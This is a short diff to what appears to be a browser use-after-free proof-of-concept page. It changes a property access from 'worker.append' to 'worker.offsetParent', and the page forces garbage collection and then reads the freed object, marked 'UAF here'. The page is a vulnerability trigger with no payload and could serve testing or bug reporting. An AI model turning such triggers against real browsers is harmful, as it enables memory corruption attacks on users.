@@ -5,7 +5,7 @@
         worker = document.getElementById("worker");
         window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
         var intl = setInterval(function(){
-            worker.append.a = 777;
+            worker.offsetParent.a = 777;
             window.top.f();
             clearInterval(intl);
         }, 1);
@@ -18,7 +18,7 @@
     }
     function callback(ev) {
         gc();
-        alert(worker.append.a); // UAF here.
+        alert(worker.offsetParent.a); // UAF here.
     }
     </script>
     <body onload="start();">
